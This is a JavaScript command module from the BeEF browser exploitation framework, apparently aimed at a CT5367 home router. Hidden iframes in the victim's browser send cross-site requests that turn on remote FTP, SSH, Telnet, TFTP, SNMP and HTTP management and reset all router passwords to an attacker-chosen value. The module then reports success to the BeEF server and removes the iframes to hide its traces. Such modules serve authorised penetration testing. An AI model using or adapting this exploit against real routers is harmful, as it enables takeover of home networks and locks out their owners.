//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
  var gateway = '<%= @base %>'; 
  var passwd = '<%= @password %>';

  var ct5367_iframe1 = beef.dom.createInvisibleIframe();
  ct5367_iframe1.setAttribute('src', gateway+'/scsrvcntr.cmd?action=save&ftp=1&ftp=3&http=1&http=3&icmp=1&snmp=1&snmp=3&ssh=1&ssh=3&telnet=1&telnet=3&tftp=1&tftp=3');

  var ct5367_iframe2 = beef.dom.createInvisibleIframe();
  ct5367_iframe2.setAttribute('src', gateway+'/password.cgi?usrPassword='+passwd+'&sysPassword='+passwd+'&sptPassword='+passwd);

  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");

  cleanup = function() {
    document.body.removeChild(ct5367_iframe1);
    document.body.removeChild(ct5367_iframe2);
  }
  setTimeout("cleanup()", 15000);

});

